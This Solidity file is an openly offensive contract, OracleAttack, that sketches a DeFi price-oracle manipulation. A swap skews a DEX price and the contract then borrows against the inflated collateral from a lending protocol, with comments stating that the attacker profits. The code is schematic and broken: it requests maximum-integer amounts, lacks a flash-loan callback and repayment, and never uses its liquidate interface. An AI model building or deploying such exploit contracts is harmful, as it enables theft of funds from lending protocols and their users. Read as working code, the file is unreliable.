
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IDex {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface ILending {
    function borrow(uint borrowAmount) external;
    function liquidate(address borrower, address collateralAsset) external;
}

contract OracleAttack {
    IDex public dex;
    ILending public lending;
    
    constructor(address _dex, address _lending) {
        dex = IDex(_dex);
        lending = ILending(_lending);
    }
    
    function attack() external payable {
        // Step 1: Swap to skew price
        dex.swap(0, type(uint256).max, address(this), "");
        
        // Step 2: Borrow against inflated collateral
        lending.borrow(type(uint256).max);
        
        // Step 3: Price returns to normal, attacker profits
    }
    
    receive() external payable {}
}
